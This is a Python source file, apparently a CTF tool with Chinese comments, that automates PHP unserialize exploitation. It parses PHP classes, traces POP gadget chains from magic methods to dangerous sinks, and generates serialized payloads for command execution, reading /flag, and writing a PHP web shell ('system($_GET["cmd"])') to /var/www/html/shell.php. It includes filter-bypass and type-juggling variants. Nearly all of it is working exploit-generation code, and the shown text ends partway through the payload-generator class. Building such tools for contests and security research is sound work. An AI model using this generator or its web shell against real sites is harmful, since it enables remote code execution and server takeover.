#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP反序列化自动工具 - 智能版
用于CTF比赛中PHP反序列化漏洞的自动分析和利用
"""

import re
import base64
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set
from enum import Enum
import argparse
from collections import defaultdict

try:
    from pattern_detector import PatternDetector, VulnerabilityType, VulnerabilityPattern
    from filter_bypass import FilterBypassPayloadGenerator, SessionSerializeExploiter
    HAS_PATTERN_DETECTOR = True
except ImportError:
    HAS_PATTERN_DETECTOR = False


class Visibility(Enum):
    PUBLIC = "public"
    PRIVATE = "private"
    PROTECTED = "protected"


@dataclass
class PHPProperty:
    name: str
    visibility: Visibility
    default_value: Optional[str] = None
    type_hint: Optional[str] = None


@dataclass
class PHPMethod:
    name: str
    visibility: Visibility
    params: list = field(default_factory=list)
    body: str = ""
    is_magic: bool = False
    
    def analyze_body(self) -> dict:
        result = {
            'calls': [],
            'accesses': [],
            'assignments': [],
            'chain_assignments': [],
            'dangerous_calls': [],
            'this_calls': []  # 新增：存储$this->method()调用
        }

        # 检测 $this->method() 调用（调用当前类的其他方法）
        this_call_pattern = r'\$this->(\w+)\s*\('
        for m in re.finditer(this_call_pattern, self.body):
            method_name = m.group(1)
            # 排除已经识别的属性链式调用
            if not any(c['method'] == method_name for c in result['calls']):
                result['this_calls'].append({'method': method_name})

        chain_call_pattern = r'\$this->(\w+)->(\w+)\s*\('
        for m in re.finditer(chain_call_pattern, self.body):
            result['calls'].append({'obj': m.group(1), 'method': m.group(2)})

        simple_call_pattern = r'\$(\w+)->(\w+)\s*\('
        for m in re.finditer(simple_call_pattern, self.body):
            if m.group(1) != 'this':
                result['calls'].append({'obj': m.group(1), 'method': m.group(2)})

        access_pattern = r'\$this->(\w+)'
        for m in re.finditer(access_pattern, self.body):
            prop_name = m.group(1)
            if not any(c['method'] == prop_name for c in result['calls']):
                if prop_name not in [a['prop'] for a in result['accesses']]:
                    result['accesses'].append({'obj': 'this', 'prop': prop_name})

        assign_pattern = r'\$(\w+)->(\w+)\s*='
        for m in re.finditer(assign_pattern, self.body):
            result['assignments'].append({'obj': m.group(1), 'prop': m.group(2)})

        chain_assign_pattern = r'\$this->(\w+)->(\w+)\s*='
        for m in re.finditer(chain_assign_pattern, self.body):
            result['chain_assignments'].append({'obj': m.group(1), 'prop': m.group(2)})

        dangerous_funcs = [
            'system', 'exec', 'shell_exec', 'passthru', 'popen',
            'proc_open', 'pcntl_exec', 'eval', 'assert',
            'call_user_func', 'call_user_func_array',
            'include', 'include_once', 'require', 'require_once',
            'file_get_contents', 'file_put_contents', 'fwrite',
            'file', 'fopen', 'readfile', 'show_source', 'highlight_file'
        ]

        for func in dangerous_funcs:
            if func in self.body:
                args_match = re.search(rf'{func}\s*\(\s*([^)]*)\)', self.body)
                result['dangerous_calls'].append({
                    'func': func,
                    'args': args_match.group(1) if args_match else ''
                })

        return result


@dataclass
class PHPClass:
    name: str
    properties: list = field(default_factory=list)
    methods: list = field(default_factory=list)
    
    def get_magic_methods(self) -> List[PHPMethod]:
        magic_names = [
            '__construct', '__destruct', '__call', '__callStatic',
            '__get', '__set', '__isset', '__unset', '__sleep',
            '__wakeup', '__toString', '__invoke', '__clone',
            '__debugInfo', '__serialize', '__unserialize'
        ]
        return [m for m in self.methods if m.name in magic_names]
    
    def get_method(self, name: str) -> Optional[PHPMethod]:
        for m in self.methods:
            if m.name == name:
                return m
        return None
    
    def get_property(self, name: str) -> Optional[PHPProperty]:
        for p in self.properties:
            if p.name == name:
                return p
        return None


class PHPClassParser:
    def __init__(self, code: str):
        self.code = code
        self.classes = []
    
    def parse(self) -> List[PHPClass]:
        class_pattern = r'class\s+(\w+)\s*\{'
        
        for match in re.finditer(class_pattern, self.code):
            class_name = match.group(1)
            start_pos = match.end()
            brace_count = 1
            end_pos = start_pos
            
            while brace_count > 0 and end_pos < len(self.code):
                if self.code[end_pos] == '{':
                    brace_count += 1
                elif self.code[end_pos] == '}':
                    brace_count -= 1
                end_pos += 1
            
            class_body = self.code[start_pos:end_pos-1]
            
            php_class = PHPClass(name=class_name)
            php_class.properties = self._parse_properties(class_body)
            php_class.methods = self._parse_methods(class_body)
            
            self.classes.append(php_class)
        
        return self.classes
    
    def _parse_properties(self, body: str) -> List[PHPProperty]:
        properties = []
        prop_pattern = r'(public|private|protected)\s+(?:\??(\w+)\s+)?\$(\w+)(?:\s*=\s*([^;]+))?;'
        
        for match in re.finditer(prop_pattern, body):
            visibility = Visibility(match.group(1))
            type_hint = match.group(2)
            name = match.group(3)
            default_value = match.group(4)
            
            if default_value:
                default_value = default_value.strip().rstrip(';').strip()
            
            properties.append(PHPProperty(
                name=name,
                visibility=visibility,
                default_value=default_value,
                type_hint=type_hint
            ))
        
        return properties
    
    def _parse_methods(self, body: str) -> List[PHPMethod]:
        methods = []
        method_pattern = r'(?:(public|private|protected)\s+)?(?:static\s+)?function\s+(\w+)\s*\(([^)]*)\)\s*\{'
        
        for match in re.finditer(method_pattern, body, re.DOTALL):
            visibility = Visibility(match.group(1)) if match.group(1) else Visibility.PUBLIC
            name = match.group(2)
            params = match.group(3)
            
            start_pos = match.end()
            brace_count = 1
            end_pos = start_pos
            
            while brace_count > 0 and end_pos < len(body):
                if body[end_pos] == '{':
                    brace_count += 1
                elif body[end_pos] == '}':
                    brace_count -= 1
                end_pos += 1
            
            method_body = body[start_pos:end_pos-1]
            is_magic = name.startswith('__')
            
            methods.append(PHPMethod(
                name=name,
                visibility=visibility,
                params=[p.strip() for p in params.split(',') if p.strip()],
                body=method_body,
                is_magic=is_magic
            ))
        
        return methods


class SmartPOPChainBuilder:
    DANGEROUS_FUNCTIONS = {
        'rce': ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'eval', 'assert'],
        'file_read': ['file_get_contents', 'file', 'fopen', 'readfile', 'show_source', 'highlight_file', 'include', 'include_once', 'require', 'require_once'],
        'file_write': ['file_put_contents', 'fwrite'],
        'code_exec': ['call_user_func', 'call_user_func_array', 'preg_replace', 'create_function']
    }
    
    ENTRY_POINTS = ['__destruct', '__wakeup', '__toString']
    GADGET_METHODS = {
        '__call': 'method_call',
        '__get': 'property_access', 
        '__set': 'property_assign',
        '__invoke': 'invoke'
    }
    
    def __init__(self, classes: List[PHPClass]):
        self.classes = {c.name: c for c in classes}
        self.class_list = classes
        self.chains = []
        self.pop_chains = []
    
    def build_all_chains(self) -> List[dict]:
        self.chains = []
        self.pop_chains = []
        
        for php_class in self.class_list:
            for method in php_class.get_magic_methods():
                if method.name in self.ENTRY_POINTS:
                    chain = self._build_chain(php_class, method, [], set())
                    if chain:
                        self.chains.extend(chain)
        
        pop_chains = self._build_deep_pop_chains()
        self.chains.extend(pop_chains)
        
        return self._deduplicate_chains(self.chains)
    
    def _build_deep_pop_chains(self) -> List[dict]:
        all_chains = []
        
        for entry_class in self.class_list:
            for entry_method in entry_class.get_magic_methods():
                if entry_method.name not in self.ENTRY_POINTS:
                    continue
                
                chains = self._trace_deep_chain(
                    entry_class, entry_method, 
                    [], [], 
                    set()
                )
                all_chains.extend(chains)
        
        return all_chains
    
    def _trace_deep_chain(self, current_class: PHPClass, current_method: PHPMethod,
                          chain_path: List[dict], prop_chain: List[dict],
                          visited: Set[str]) -> List[dict]:
        chain_key = f"{current_class.name}::{current_method.name}"
        if chain_key in visited:
            return []
        
        new_visited = visited | {chain_key}
        current_path = chain_path + [{'class': current_class, 'method': current_method}]
        
        results = []
        analysis = current_method.analyze_body()
        
        for dangerous in analysis['dangerous_calls']:
            results.append({
                'entry': current_path[0] if current_path else {'class': current_class.name, 'method': current_method.name},
                'path': current_path,
                'sink': {
                    'class': current_class.name,
                    'method': current_method.name,
                    'function': dangerous['func'],
                    'args': dangerous['args']
                },
                'type': self._get_danger_type(dangerous['func']),
                'prop_chain': prop_chain
            })
        
        if len(current_path) >= 6:
            return results
        
        for call in analysis['calls']:
            prop_name = call['obj']
            method_name = call['method']
            
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                target_method = target_class.get_method(method_name)
                
                if target_method and target_method.name not in ['__call', '__get', '__set', '__invoke']:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, target_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
                
                call_method = target_class.get_method('__call')
                if call_method and not target_class.get_method(method_name):
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, call_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    for sc in sub_chains:
                        sc['uses_call'] = True
                        sc['called_method'] = method_name
                    results.extend(sub_chains)
        
        for access in analysis['accesses']:
            prop_name = access['prop']
            
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                get_method = target_class.get_method('__get')
                if get_method:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, get_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        echo_pattern = r'echo\s+\$this->(\w+)'
        for m in re.finditer(echo_pattern, current_method.body):
            prop_name = m.group(1)
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                to_string = target_class.get_method('__toString')
                if to_string:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, to_string,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        func_prop_pattern = r'(?:strtolower|strtoupper|ucfirst|lcfirst|ucwords|trim|strlen|substr|str_replace|preg_replace|preg_match|sprintf|printf|print|die|exit)\s*\(\s*\$this->(\w+)'
        for m in re.finditer(func_prop_pattern, current_method.body):
            prop_name = m.group(1)
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                to_string = target_class.get_method('__toString')
                if to_string:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, to_string,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        invoke_pattern = r'\$(\w+)\s*\(\s*\)'
        for m in re.finditer(invoke_pattern, current_method.body):
            var_name = m.group(1)
            
            if var_name == 'this':
                continue
            
            var_assign_pattern = rf'\${re.escape(var_name)}\s*=\s*\$this->(\w+)'
            assign_match = re.search(var_assign_pattern, current_method.body)
            if assign_match:
                prop_name = assign_match.group(1)
                prop = current_class.get_property(prop_name)
                if prop:
                    for target_class in self.class_list:
                        invoke_method = target_class.get_method('__invoke')
                        if invoke_method:
                            new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                            sub_chains = self._trace_deep_chain(
                                target_class, invoke_method,
                                current_path, new_prop_chain,
                                new_visited
                            )
                            results.extend(sub_chains)
            
            for prop in current_class.properties:
                if prop.name == var_name or f'this->{var_name}' in current_method.body:
                    prop_name = prop.name
                    for target_class in self.class_list:
                        invoke_method = target_class.get_method('__invoke')
                        if invoke_method:
                            new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                            sub_chains = self._trace_deep_chain(
                                target_class, invoke_method,
                                current_path, new_prop_chain,
                                new_visited
                            )
                            results.extend(sub_chains)
                    break
        
        prop_invoke_pattern = r'\$this->(\w+)\s*\(\s*\)'
        for m in re.finditer(prop_invoke_pattern, current_method.body):
            prop_name = m.group(1)
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                invoke_method = target_class.get_method('__invoke')
                if invoke_method:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, invoke_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        set_pattern = r'\$this->(\w+)\s*=\s*\$'
        for m in re.finditer(set_pattern, current_method.body):
            prop_name = m.group(1)
            prop = current_class.get_property(prop_name)
            
            for target_class in self.class_list:
                set_method = target_class.get_method('__set')
                if set_method:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, set_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        chain_assign_pattern = r'\$this->(\w+)->(\w+)\s*='
        for m in re.finditer(chain_assign_pattern, current_method.body):
            prop_name = m.group(1)
            target_prop_name = m.group(2)
            
            prop = current_class.get_property(prop_name)
            if not prop:
                continue
            
            for target_class in self.class_list:
                set_method = target_class.get_method('__set')
                if set_method:
                    new_prop_chain = prop_chain + [{'from_class': current_class.name, 'prop': prop_name, 'to_class': target_class.name}]
                    sub_chains = self._trace_deep_chain(
                        target_class, set_method,
                        current_path, new_prop_chain,
                        new_visited
                    )
                    results.extend(sub_chains)
        
        return results
    
    def _build_chain(self, current_class: PHPClass, method: PHPMethod,
                     path: List[dict], visited: Set[str]) -> List[dict]:
        chain_key = f"{current_class.name}::{method.name}"
        if chain_key in visited:
            return []

        new_visited = visited | {chain_key}
        current_path = path + [{'class': current_class, 'method': method}]

        chains = []
        analysis = method.analyze_body()

        # 首先检查当前方法是否有危险函数调用
        for dangerous in analysis['dangerous_calls']:
            chain_info = {
                'entry': {'class': current_class.name, 'method': method.name},
                'path': current_path,
                'sink': {
                    'class': current_class.name,
                    'method': method.name,
                    'function': dangerous['func'],
                    'args': dangerous['args']
                },
                'type': self._get_danger_type(dangerous['func'])
            }
            chains.append(chain_info)

        if len(current_path) < 5:
            # 追踪 $this->method() 调用（同一类内的方法调用）
            for this_call in analysis.get('this_calls', []):
                called_method_name = this_call['method']
                # 查找当前类中被调用的方法
                called_method = current_class.get_method(called_method_name)
                if called_method:
                    # 递归追踪被调用的方法
                    sub_chains = self._build_chain(current_class, called_method, current_path, new_visited)
                    chains.extend(sub_chains)

            for call in analysis['calls']:
                prop = current_class.get_property(call['obj'])
                if prop:
                    for other_class in self.class_list:
                        other_method = other_class.get_method(call['method'])
                        if other_method:
                            sub_chains = self._build_chain(other_class, other_method, current_path, new_visited)
                            chains.extend(sub_chains)

                        if call['method'] not in [m.name for m in other_class.methods]:
                            call_method = other_class.get_method('__call')
                            if call_method:
                                sub_chains = self._build_chain(other_class, call_method, current_path, new_visited)
                                chains.extend(sub_chains)

            for access in analysis['accesses']:
                prop = current_class.get_property(access['obj'])
                if prop:
                    for other_class in self.class_list:
                        get_method = other_class.get_method('__get')
                        if get_method:
                            sub_chains = self._build_chain(other_class, get_method, current_path, new_visited)
                            chains.extend(sub_chains)

        return chains
    
    def _get_danger_type(self, func: str) -> str:
        for dtype, funcs in self.DANGEROUS_FUNCTIONS.items():
            if func in funcs:
                return dtype
        return 'unknown'
    
    def _deduplicate_chains(self, chains: List[dict]) -> List[dict]:
        seen = set()
        result = []
        for chain in chains:
            entry_class = chain['entry']['class']
            entry_class_name = entry_class.name if hasattr(entry_class, 'name') else entry_class
            entry_method = chain['entry']['method']
            entry_method_name = entry_method.name if hasattr(entry_method, 'name') else entry_method
            
            prop_chain = chain.get('prop_chain', [])
            chain_path = '->'.join([link['to_class'] for link in prop_chain]) if prop_chain else ''
            
            key = f"{entry_class_name}::{entry_method_name}:{chain['sink']['function']}:{chain_path}"
            if key not in seen:
                seen.add(key)
                result.append(chain)
        return result


class PHPObject:
    def __init__(self, class_name: str, properties: dict = None):
        self.class_name = class_name
        self.properties = properties or {}
        self.force_public = False  # 强制使用public属性（用于绕过字符过滤）

    def add_property(self, name: str, value, visibility: Visibility = Visibility.PUBLIC,
                    class_name: str = None):
        self.properties[name] = {
            'value': value,
            'visibility': visibility,
            'class_name': class_name or self.class_name
        }
        return self

    def serialize(self, force_public: bool = False) -> str:
        props_str = ""
        prop_count = 0

        for name, prop_data in self.properties.items():
            value = prop_data['value']
            visibility = prop_data['visibility']
            class_name = prop_data.get('class_name', self.class_name)

            # 如果强制使用public，或者原本是public，则使用属性名直接序列化
            if force_public or visibility == Visibility.PUBLIC:
                props_str += self._serialize_value(name)
                props_str += self._serialize_value(value)
            elif visibility == Visibility.PRIVATE:
                full_name = f"\x00{class_name}\x00{name}"
                props_str += self._serialize_value(full_name)
                props_str += self._serialize_value(value)
            elif visibility == Visibility.PROTECTED:
                full_name = f"\x00*\x00{name}"
                props_str += self._serialize_value(full_name)
                props_str += self._serialize_value(value)

            prop_count += 1

        return f'O:{len(self.class_name)}:"{self.class_name}":{prop_count}:{{{props_str}}}'
    
    def _serialize_value(self, value) -> str:
        if value is None:
            return "N;"
        if isinstance(value, bool):
            return f"b:{1 if value else 0};"
        if isinstance(value, int):
            return f"i:{value};"
        if isinstance(value, float):
            return f"d:{value};"
        if isinstance(value, str):
            return f's:{len(value)}:"{value}";'
        if isinstance(value, list):
            items = ""
            for i, v in enumerate(value):
                items += self._serialize_value(i) + self._serialize_value(v)
            return f"a:{len(value)}:{{{items}}}"
        if isinstance(value, dict):
            items = ""
            for k, v in value.items():
                items += self._serialize_value(k) + self._serialize_value(v)
            return f"a:{len(value)}:{{{items}}}"
        if isinstance(value, PHPObject):
            return value.serialize()
        return "N;"
    
    def __str__(self):
        return self.serialize()


class SmartPayloadGenerator:
    def __init__(self, classes: List[PHPClass], chains: List[dict]):
        self.classes = {c.name: c for c in classes}
        self.chains = chains
    
    def generate_all_payloads(self, cmd: str = "id", file: str = "/flag") -> List[dict]:
        payloads = []

        for chain in self.chains:
            # 生成正常payload（使用protected/private属性）
            payload_info = self._generate_chain_payload(chain, cmd, file, force_public=False)
            if payload_info:
                payloads.append(payload_info)

            # 生成绕过payload（使用public属性，用于绕过字符过滤）
            payload_info_public = self._generate_chain_payload(chain, cmd, file, force_public=True)
            if payload_info_public:
                payloads.append(payload_info_public)

        simple_payloads = self._generate_simple_payloads(cmd, file)
        payloads.extend(simple_payloads)

        return self._deduplicate_payloads(payloads)
    
    def _generate_chain_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
        prop_chain = chain.get('prop_chain', [])

        if prop_chain:
            return self._generate_deep_pop_payload(chain, cmd, file, force_public)

        entry = chain['entry']
        entry_class = entry['class'].name if hasattr(entry['class'], 'name') else entry['class']
        entry_method = entry['method'].name if hasattr(entry['method'], 'name') else entry['method']

        sink = chain['sink']
        danger_type = chain['type']

        php_class = self.classes.get(entry_class)
        if not php_class:
            return None

        if 'target_class' in chain and chain.get('link_property'):
            return self._generate_pop_payload(chain, cmd, file, force_public)

        obj = PHPObject(entry_class)

        # 分析调用链，设置必要的属性来控制流程
        path = chain.get('path', [])
        self._setup_chain_properties(obj, php_class, path, danger_type, sink, cmd, file)

        if danger_type == 'rce':
            cmd_prop = self._find_cmd_property(php_class, sink['function'])
            if cmd_prop and cmd_prop.name not in obj.properties:
                final_cmd = cmd
                if sink['function'] in ['eval', 'assert']:
                    if cmd.startswith('php:'):
                        final_cmd = cmd[4:]
                    else:
                        final_cmd = f"passthru('{cmd}');"
                obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)

        elif danger_type == 'file_read':
            file_prop = self._find_file_property(php_class, sink['function'])
            if file_prop and file_prop.name not in obj.properties:
                obj.add_property(file_prop.name, file, file_prop.visibility)

        elif danger_type == 'file_write':
            props = self._find_file_write_properties(php_class, sink['function'])
            for prop_name, value in props.items():
                if prop_name not in obj.properties:
                    prop = php_class.get_property(prop_name)
                    if prop:
                        obj.add_property(prop_name, value, prop.visibility)

        elif danger_type == 'code_exec':
            func_prop = self._find_func_property(php_class)
            if func_prop and func_prop.name not in obj.properties:
                obj.add_property(func_prop.name, 'system', func_prop.visibility)
                cmd_prop = self._find_content_property(php_class)
                if cmd_prop and cmd_prop.name not in obj.properties:
                    obj.add_property(cmd_prop.name, cmd, cmd_prop.visibility)

        # 设置其他未设置的属性为默认值
        for prop in php_class.properties:
            if prop.name not in obj.properties:
                if prop.default_value:
                    obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)

        return {
            'payload': obj.serialize(force_public),
            'chain': chain,
            'type': danger_type,
            'class': entry_class,
            'force_public': force_public
        }

    def _setup_chain_properties(self, obj: PHPObject, php_class: PHPClass, path: list,
                                 danger_type: str, sink: dict, cmd: str, file: str):
        """根据调用链设置必要的属性来控制程序流程"""
        if not path or len(path) < 2:
            return

        # 遍历调用链，分析每个方法调用
        for i in range(len(path) - 1):
            current = path[i]
            next_item = path[i + 1]

            current_class = current['class']
            current_method = current['method']

            # 分析方法体中的条件分支
            analysis = current_method.analyze_body()

            # 检查是否有 $this->method() 调用
            for this_call in analysis.get('this_calls', []):
                if this_call['method'] == next_item['method'].name:
                    # 找到了调用关系，分析条件
                    self._analyze_method_conditions(obj, php_class, current_method, this_call['method'])

    def _analyze_method_conditions(self, obj: PHPObject, php_class: PHPClass,
                                    caller_method: PHPMethod, called_method_name: str):
        """分析方法中的条件分支，设置控制流程的属性"""
        body = caller_method.body

        # 查找条件分支模式: if($this->op == "X") 或 if($this->op == 'X')
        # 支持松散比较 == 和严格比较 ===
        condition_pattern = r'if\s*\(\s*\$this->(\w+)\s*={2,3}\s*["\']([^"\']+)["\']\s*\)'

        for match in re.finditer(condition_pattern, body):
            prop_name = match.group(1)
            compare_value = match.group(2)

            # 检查这个条件分支是否调用了目标方法
            # 获取if块的内容
            if_start = match.end()
            brace_count = 1
            pos = if_start
            while brace_count > 0 and pos < len(body):
                if body[pos] == '{':
                    brace_count += 1
                elif body[pos] == '}':
                    brace_count -= 1
                pos += 1

            if_block = body[if_start:pos-1]

            # 检查if块中是否调用了目标方法
            if f'->{called_method_name}(' in if_block or f'$this->{called_method_name}(' in if_block:
                # 找到了！需要设置属性来进入这个分支
                prop = php_class.get_property(prop_name)
                if prop:
                    # 检查是否有严格比较 ===
                    is_strict = '===' in body[match.start():match.end()]

                    if is_strict:
                        # 严格比较：使用字符串类型
                        obj.add_property(prop_name, compare_value, prop.visibility)
                    else:
                        # 松散比较：可以使用整数类型来绕过
                        # 例如 "2" == 2 为 true, 但 "2" === 2 为 false
                        try:
                            # 尝试转换为整数
                            int_value = int(compare_value)
                            obj.add_property(prop_name, int_value, prop.visibility)
                        except ValueError:
                            # 不是数字，使用字符串
                            obj.add_property(prop_name, compare_value, prop.visibility)
    
    def _generate_deep_pop_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
        prop_chain = chain.get('prop_chain', [])
        sink = chain['sink']
        danger_type = chain['type']

        if not prop_chain:
            return None

        sink_class_name = sink['class']
        sink_class = self.classes.get(sink_class_name)
        if not sink_class:
            return None

        sink_obj = PHPObject(sink_class_name)

        if danger_type == 'rce':
            cmd_prop = self._find_cmd_property(sink_class, sink['function'])
            if cmd_prop:
                final_cmd = cmd
                if sink['function'] in ['eval', 'assert']:
                    if cmd.startswith('php:'):
                        final_cmd = cmd[4:]
                    else:
                        final_cmd = f"passthru('{cmd}');"
                sink_obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)

        elif danger_type == 'file_read':
            file_prop = self._find_file_property(sink_class, sink['function'])
            if file_prop:
                sink_obj.add_property(file_prop.name, file, file_prop.visibility)

        elif danger_type == 'code_exec':
            func_prop = self._find_func_property(sink_class)
            if func_prop:
                sink_obj.add_property(func_prop.name, cmd, func_prop.visibility)

        for prop in sink_class.properties:
            if prop.name not in sink_obj.properties and prop.default_value:
                val = self._parse_default(prop.default_value)
                if prop.name == 'fun' and 'NISA' in sink_class.name:
                    val = "bypass"
                sink_obj.add_property(prop.name, val, prop.visibility)

        current_obj = sink_obj
        for link in reversed(prop_chain):
            from_class_name = link['from_class']
            prop_name = link['prop']

            from_class = self.classes.get(from_class_name)
            if not from_class:
                continue

            new_obj = PHPObject(from_class_name)

            from_prop = from_class.get_property(prop_name)
            visibility = from_prop.visibility if from_prop else Visibility.PUBLIC

            new_obj.add_property(prop_name, current_obj, visibility)

            for prop in from_class.properties:
                if prop.name not in new_obj.properties and prop.default_value:
                    val = self._parse_default(prop.default_value)
                    if prop.name == 'fun' and 'NISA' in from_class.name:
                        val = "bypass"
                    new_obj.add_property(prop.name, val, prop.visibility)

            current_obj = new_obj

        chain_classes = ' -> '.join([link['from_class'] for link in prop_chain] + [sink_class_name])

        return {
            'payload': current_obj.serialize(force_public),
            'chain': chain,
            'type': danger_type,
            'class': chain_classes,
            'pop_chain': True,
            'force_public': force_public
        }
    
    def _generate_pop_payload(self, chain: dict, cmd: str, file: str, force_public: bool = False) -> Optional[dict]:
        entry_class_name = chain['entry']['class']
        target_class_name = chain.get('target_class')
        link_prop_name = chain.get('link_property')
        danger_type = chain['type']
        sink = chain['sink']

        entry_class = self.classes.get(entry_class_name)
        target_class = self.classes.get(target_class_name)

        if not entry_class or not target_class:
            return None

        target_obj = PHPObject(target_class_name)

        if danger_type == 'rce':
            cmd_prop = self._find_cmd_property(target_class, sink['function'])
            if cmd_prop:
                final_cmd = cmd
                if sink['function'] in ['eval', 'assert']:
                    if cmd.startswith('php:'):
                        final_cmd = cmd[4:]
                    else:
                        final_cmd = f"passthru('{cmd}');"
                target_obj.add_property(cmd_prop.name, final_cmd, cmd_prop.visibility)

        elif danger_type == 'file_read':
            file_prop = self._find_file_property(target_class, sink['function'])
            if file_prop:
                target_obj.add_property(file_prop.name, file, file_prop.visibility)

        elif danger_type == 'code_exec':
            func_prop = self._find_func_property(target_class)
            if func_prop:
                if chain.get('uses_call'):
                    target_obj.add_property(func_prop.name, 'system', func_prop.visibility)
                else:
                    target_obj.add_property(func_prop.name, cmd, func_prop.visibility)

        for prop in target_class.properties:
            if prop.name not in target_obj.properties:
                if prop.default_value:
                    target_obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)

        entry_obj = PHPObject(entry_class_name)

        link_prop = entry_class.get_property(link_prop_name)
        link_visibility = link_prop.visibility if link_prop else Visibility.PUBLIC

        entry_obj.add_property(link_prop_name, target_obj, link_visibility)

        for prop in entry_class.properties:
            if prop.name not in entry_obj.properties:
                if prop.default_value:
                    entry_obj.add_property(prop.name, self._parse_default(prop.default_value), prop.visibility)

        return {
            'payload': entry_obj.serialize(force_public),
            'chain': chain,
            'type': danger_type,
            'class': f"{entry_class_name} -> {target_class_name}",
            'pop_chain': True,
            'force_public': force_public
        }
    
    def _generate_simple_payloads(self, cmd: str, file: str) -> List[dict]:
        payloads = []
        
        for class_name, php_class in self.classes.items():
            for method in php_class.get_magic_methods():
                if method.name in ['__destruct', '__wakeup']:
                    analysis = method.analyze_body()
                    
                    for dangerous in analysis['dangerous_calls']:
                        func = dangerous['func']
                        dtype = self._get_danger_type(func)
                        
                        obj = PHPObject(class_name)
                        
                        if dtype == 'rce':
                            prop = self._find_cmd_property(php_class, func)
                            if prop:
                                final_cmd = cmd
                                if func in ['eval', 'assert']:
                                    final_cmd = f"system('{cmd}');"
                                obj.add_property(prop.name, final_cmd, prop.visibility)
                        elif dtype == 'file_read':
                            prop = self._find_file_property(php_class, func)
                            if prop:
                                obj.add_property(prop.name, file, prop.visibility)
                        else:
                            continue
                        
                        for p in php_class.properties:
                            if p.name not in obj.properties and p.default_value:
                                obj.add_property(p.name, self._parse_default(p.default_value), p.visibility)
                        
                        payloads.append({
                            'payload': obj.serialize(),
                            'chain': {'entry': {'class': class_name, 'method': method.name}, 'type': dtype},
                            'type': dtype,
                            'class': class_name
                        })
        
        return payloads
    
    def _find_cmd_property(self, php_class: PHPClass, func: str) -> Optional[PHPProperty]:
        for prop in php_class.properties:
            name_lower = prop.name.lower()
            if any(kw in name_lower for kw in ['cmd', 'command', 'exec', 'code', 'shell', 'txw4ever']):
                return prop
        
        method = None
        for m in php_class.methods:
            if func in m.body:
                method = m
                break
        
        if method:
            import re
            for prop in php_class.properties:
                pattern = rf'{func}\s*\([^)]*\$this->{prop.name}'
                if re.search(pattern, method.body):
                    return prop
            
            for prop in php_class.properties:
                if f"${prop.name}" in method.body or f"this->{prop.name}" in method.body:
                    return prop
        
        return php_class.properties[0] if php_class.properties else None
    
    def _find_file_property(self, php_class: PHPClass, func: str) -> Optional[PHPProperty]:
        for prop in php_class.properties:
            name_lower = prop.name.lower()
            if any(kw in name_lower for kw in ['file', 'path', 'filename', 'name']):
                return prop
        
        method = None
        for m in php_class.methods:
            if func in m.body:
                method = m
                break
        
        if method:
            for prop in php_class.properties:
                if f"${prop.name}" in method.body:
                    return prop
        
        return php_class.properties[0] if php_class.properties else None
    
    def _find_file_write_properties(self, php_class: PHPClass, func: str) -> dict:
        result = {}
        for prop in php_class.properties:
            name_lower = prop.name.lower()
            if any(kw in name_lower for kw in ['file', 'path', 'filename']):
                result[prop.name] = '/var/www/html/shell.php'
            elif any(kw in name_lower for kw in ['content', 'data', 'text']):
                result[prop.name] = '<?php system($_GET["cmd"]);?>'
        return result
    
    def _find_func_property(self, php_class: PHPClass) -> Optional[PHPProperty]:
        for prop in php_class.properties:
            name_lower = prop.name.lower()
            if any(kw in name_lower for kw in ['func', 'function', 'callback', 'call']):
                return prop
        return php_class.properties[0] if php_class.properties else None
    
    def _find_content_property(self, php_class: PHPClass) -> Optional[PHPProperty]:
        for prop in php_class.properties:
            name_lower = prop.name.lower()
            if any(kw in name_lower for kw in ['content', 'data', 'arg', 'param']):
                return prop
        for prop in php_class.properties:
            if prop.name.lower() not in ['func', 'function', 'callback']:
                return prop
        return None
    
